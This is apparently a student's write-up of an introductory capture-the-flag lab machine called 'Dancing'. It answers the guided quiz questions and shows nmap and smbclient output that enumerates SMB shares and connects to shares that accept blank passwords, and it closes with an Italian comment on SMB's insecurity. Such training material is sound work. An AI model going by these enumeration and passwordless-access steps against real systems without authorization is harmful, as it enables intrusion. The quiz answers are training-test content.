About

Dancing is a very easy Windows machine which introduces the Server Message Block (SMB) protocol, its enumeration and its exploitation when misconfigured to allow access without a password.

What does the 3-letter acronym SMB stand for?
Server message block

What port does SMB use to operate at?
445

What is the service name for port 445 that came up in our nmap scan?

❯ sudo nmap 10.129.46.195 -sS -sV -p 445
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 14:04 -0400
Nmap scan report for 10.129.46.195
Host is up (0.036s latency).

PORT    STATE    SERVICE      VERSION
445/tcp filtered microsoft-ds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds

What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available SMB shares on Dancing?
-L

How many shares are there on Dancing?
4
 smbclient -L 10.129.46.195
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.46.195 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

What is the name of the share we are able to access in the end with a blank password?
WorkShares
 smbclient \\\\10.129.46.195\\ADMIN
Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
❯ smbclient \\\\10.129.46.195\\ADMIN$
Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED
❯ smbclient \\\\10.129.46.195\\C$
Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED
❯ smbclient \\\\10.129.46.195\\IPC$
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 
❯ smbclient \\\\10.129.46.195\\WorkShares
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 

What is the command we can use within the SMB shell to download the files we find?
Get

Submit root flag
Fatto

Dalla macchina si evince che, come sapevamo, smp e un vecchio protocollo poco sicuro, in cui abbiamo trovato diverse misconfiguration per mancanza di password
